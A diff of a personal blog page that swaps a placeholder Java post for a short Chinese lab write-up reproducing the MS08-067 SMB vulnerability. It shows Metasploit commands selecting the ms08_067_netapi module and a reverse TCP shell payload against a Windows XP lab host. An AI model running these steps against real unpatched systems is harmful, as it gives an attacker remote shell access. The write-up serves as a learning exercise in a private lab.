@@ -6,19 +6,24 @@
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
   <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
   
-  <title>Java从入门到放弃 | 个人博客作业</title>
+  <title>ms08_067漏洞复现 | 个人博客作业</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="##这是一个新页面##  Java相关的知识 Java入门">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Java从入门到放弃">
-<meta property="og:url" content="http://yoursite.com/Java从入门到放弃/index.html">
+  <meta name="description" content="准备工作 渗透测试环境 kaliLinux 2018  IP地址：10.0.0.150 Windows Xp   IP地址：10.0.0.130 攻击步骤要点：445端口开放，系统未打补丁（sp1、sp2、sp3） 渗透工具：metasploit 攻击模块：exploit/windows/smb/ms08_067 攻击载荷：generic/shell_reverse_tcp 设置参数：RHOST">
+<meta name="keywords" content="渗透测试,Kali,漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ms08_067漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2018/12/26/ms08-067漏洞复现/index.html">
 <meta property="og:site_name" content="个人博客作业">
-<meta property="og:description" content="##这是一个新页面##  Java相关的知识 Java入门">
+<meta property="og:description" content="准备工作 渗透测试环境 kaliLinux 2018  IP地址：10.0.0.150 Windows Xp   IP地址：10.0.0.130 攻击步骤要点：445端口开放，系统未打补丁（sp1、sp2、sp3） 渗透工具：metasploit 攻击模块：exploit/windows/smb/ms08_067 攻击载荷：generic/shell_reverse_tcp 设置参数：RHOST">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-12-18T00:50:14.914Z">
+<meta property="og:image" content="http://vps.zsx666.tk/images/2018/12/22/12-1P32G61439.jpg">
+<meta property="og:image" content="http://vps.zsx666.tk/images/2018/12/22/12-1P32G61439.jpg">
+<meta property="og:image" content="http://vps.zsx666.tk/images/2018/12/22/12-1P32G61439.jpg">
+<meta property="og:updated_time" content="2018-12-26T03:19:44.040Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Java从入门到放弃">
-<meta name="twitter:description" content="##这是一个新页面##  Java相关的知识 Java入门">
+<meta name="twitter:title" content="ms08_067漏洞复现">
+<meta name="twitter:description" content="准备工作 渗透测试环境 kaliLinux 2018  IP地址：10.0.0.150 Windows Xp   IP地址：10.0.0.130 攻击步骤要点：445端口开放，系统未打补丁（sp1、sp2、sp3） 渗透工具：metasploit 攻击模块：exploit/windows/smb/ms08_067 攻击载荷：generic/shell_reverse_tcp 设置参数：RHOST">
+<meta name="twitter:image" content="http://vps.zsx666.tk/images/2018/12/22/12-1P32G61439.jpg">
   
     <link rel="alternate" href="/atom.xml" title="个人博客作业" type="application/atom+xml">
   
@@ -59,10 +64,6 @@
                 主页
             </a>
             
-            <a class="nav-item" href="/文章">
-                文章
-            </a>
-            
             <a class="nav-item" href="/about">
                 关于
             </a>
@@ -79,10 +80,6 @@
                 主页
             </a>
             
-            <a class="nav-item flex-1" href="/文章">
-                文章
-            </a>
-            
             <a class="nav-item flex-1" href="/about">
                 关于
             </a>
@@ -94,7 +91,8 @@
 
   <div id="main-wrap" class="position-relative" style="margin-top: 55px;">
       <div class="main-inner-content">
-          <!--翻页-->
+          <!--博文页面-->
+
 <style>
     .header-box {
         height: 370px;
@@ -133,21 +131,46 @@
     <div class="container post-box">
         <div class="content post-title is-flex center flex-column" style="margin-bottom: 70px; overflow: auto;">
             <h1 class="has-text-centered" style="padding-bottom: 10px; border-bottom: 3px solid #fff">
-                <strong>Java从入门到放弃</strong>
+                <strong>ms08_067漏洞复现</strong>
             </h1>
             
             <div class="is-flex align-center">
                 <img class="post-avatar" src="http://vps.zsx666.tk/?/images/2018/12/19/FyBWzHluLC/favcon.gif">
                 <span style="padding:0 10px;"> <span class="sub-title">By</span> Songxin</span>
-                <span class="post-date sub-title">at: 2018-12-18</span>
+                <span class="post-date sub-title">at: 2018-12-26</span>
             </div>
+            
+                <div>
+                    
+                         <a class="tag is-post-tag" href="/tags/渗透测试/">渗透测试</a>
+                    
+                         <a class="tag is-post-tag" href="/tags/Kali/">Kali</a>
+                    
+                         <a class="tag is-post-tag" href="/tags/漏洞复现/">漏洞复现</a>
+                    
+                </div>
             
         </div>
         <div class="content" style="overflow: auto">
-            <p>##这是一个新页面##</p>
-<ol>
-<li>Java相关的知识</li>
-<li>Java入门</li>
+            <p><img src="http://vps.zsx666.tk/images/2018/12/22/12-1P32G61439.jpg" alt="alt post-cover"></p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
+<li>渗透测试环境<br> kaliLinux 2018  IP地址：10.0.0.150<br> Windows Xp   IP地址：10.0.0.130</li>
+<li>攻击步骤<pre><code>要点：445端口开放，系统未打补丁（sp1、sp2、sp3）
+渗透工具：metasploit
+攻击模块：exploit/windows/smb/ms08_067
+攻击载荷：generic/shell_reverse_tcp
+设置参数：RHOST、LHOST、LPORT、target
+</code></pre></li>
+<li>具体命令：<pre><code>msfconsole //启动metasploit
+use exploit/windows/smb/ms08_067_netapi //选择攻击模块
+set payload generic/shell_reverse_tcp   //选择攻击载荷
+set rhost = //设置目标主机地址
+set lhost = //设置shell回弹地址
+set rport = //设置攻击的目标端口
+</code></pre>x<blockquote>
+<p>开始攻击，攻击成功<br><img src="http://vps.zsx666.tk/images/2018/12/22/12-1P32G61439.jpg" alt="alt post-cover"><br>成功获得目标机器shell<br><img src="http://vps.zsx666.tk/images/2018/12/22/12-1P32G61439.jpg" alt=""></p>
+</blockquote>
+</li>
 </ol>
 
         </div>
@@ -195,6 +218,24 @@
 <script src="/js/highlight.min.js"></script>
 <script type="text/javascript"> hljs.initHighlightingOnLoad();</script>
 
+<!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC80MTcxOC8xODI2NA==">
+    <script type="text/javascript">
+       (function(d, s) {
+           var j, e = d.getElementsByTagName(s)[0];
+    
+           if (typeof LivereTower === 'function') { return; }
+    
+           j = d.createElement(s);
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+    
+           e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
       </div>
   </div>
   <style>
